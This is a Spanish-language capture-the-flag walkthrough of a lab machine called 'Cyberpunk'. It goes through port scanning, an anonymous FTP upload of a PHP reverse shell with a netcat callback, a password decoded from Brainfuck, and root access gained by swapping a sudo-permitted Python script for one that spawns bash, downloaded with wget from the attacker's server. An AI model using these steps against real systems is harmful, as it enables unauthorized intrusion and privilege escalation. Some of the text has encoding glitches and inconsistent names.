# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/c4288e3e-916f-4030-9ca3-eedfb72b31b7)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp(FTP):** --
2.  **22/tcp(SSH):** OpenSSH 9.2p1 
3. **80/tcp(HTTP):** Apache httpd 2.4.59

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Se encontró una pagina llamada `Arasaka` con una imagen.
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/e6a10e09-cf0d-4cfa-9363-fbd5b2f47517)

# Fase 2- Exploración

#### feroxbuster
```python
200      GET       27l       78w      713c http://192.168.1.8/
200      GET       27l       78w      713c http://192.168.1.8/index.html
200      GET       20l      101w      923c http://192.168.1.8/secret.txt
```
Encontró un `secret.txt` veamos que tiene.
Dicho archivo contiene el siguiente mensaje:
```python
*********************************************
*                                           *
*        Hola Netrunner,                   *
*                                           *
*   Has sido contratado por el mejor fixer  *
*   de la ciudad para llevar a cabo una     *
*   misiÃ³n crucial.                         *
*                                           *
*   Tenemos informaciÃ³n de que Arasaka,     *
*   la mega-corporaciÃ³n mÃ¡s poderosa de     *
*   Night City, estÃ¡ migrando sus sistemas  *
*   y actualmente parece ser vulnerable.    *
*   Necesitamos que te infiltres en sus    *
*   sistemas y desactives el Relic para     *
*   salvar la vida de V.                    *
*                                           *
*   Te espero en Apache.                    *
*                                           *
*                         - Alt             *
*********************************************
```
Interesante...

#### FTP
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/1a4fa82d-273b-4ead-9c9d-d10e77cc4ff5)

Si vemos bien, ftp tiene los mismos archivos que contiene la pagina web, y nos podemos conectar como el user `Anonymous`.

# Fase 3- Explotación

#### FTP
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/afb2e3ba-360c-4efe-ad0a-8dee9549520c)

Nos conectamos como usuario `Anonymous` al puerto ftp de la maquina.

```r
ftp> put reverse.php
local: reverse.php remote: reverse.php
229 Entering Extended Passive Mode (|||61522|)
150 Abriendo conexión de datos en modo BINARY para reverse.php
100% |*********************************************************|  2069       26.66 MiB/s    00:00 ETA
226 Transferencia completada
2069 bytes sent in 00:00 (942.40 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||13161|)
150 Abriendo conexión de datos en modo ASCII para file list
drwxr-xr-x   2 0        0            4096 May  1 08:49 images
-rw-r--r--   1 0        0             713 May  1 14:55 index.html
-rw-r--r--   1 ftp      nogroup      2069 Jun 16 13:39 reverse.php
-rw-r--r--   1 0        0             923 May  1 08:51 secret.txt
```
Nos pasamos una reverse shell en php. Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


```python
> nc -nvlp 443
http://192.168.1.8/reverse.php
>sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.8] 43386
Linux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux
 15:42:33 up 37 min,  0 user,  load average: 0.00, 0.37, 0.73
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Lo primero que tenemos que hacer es ponernos en modo escucha por el puerto que pusimos en el archivo. Despues lo llamamos en la web y listo, estamos dentro.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/894b37f7-cbeb-41d0-b73c-0f79b7fd6b8a)
Buscando en la máquina encuentro un usuario llamado `araska` y en el directorio `/opt` encuentro un archivo llamado `araska.txt` que esta encriptado en lo que parece ser brianfuck.

#### Araska
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/5c05d64e-23ae-4bb1-92e1-5eaa5e49ed88)
Encontramos una especie de contraseña.
```python
www-data@Cyberpunk:/home$ su arasaka
Password: cyberpunk2077
arasaka@Cyberpunk:/home$ 
```
Somos el usuario Araska.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/4c8f3a01-88ce-4096-8c31-c7762788d02d)

Como el usuario `araska` podemos ejecutar el binario `python3.11` en el archivo `/home/araska/randombase64.py`. Para escalar privilegios lo hice de esta forma:
```python
arasaka@Cyberpunk:$ mv randombase64.py r.py
Atacante:$ nano randombase64.py
Nano: 
"""
import base64
import os

message = input("Enter your string: ")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)

os.system('/bin/bash')
"""
Atacante:$ chmod +x randombase64.py
Atacante:$ python3 -m http.server 80
arasaka@Cyberpunk:$ wget 192.168.1.2/randombase64.py
Atacante:$ nc -nvlp 443
arasaka@Cyberpunk:$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
listening on [any] 443 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.8] 40656
# whoami
whoami
root
# 
```
Y somos usuario root!.
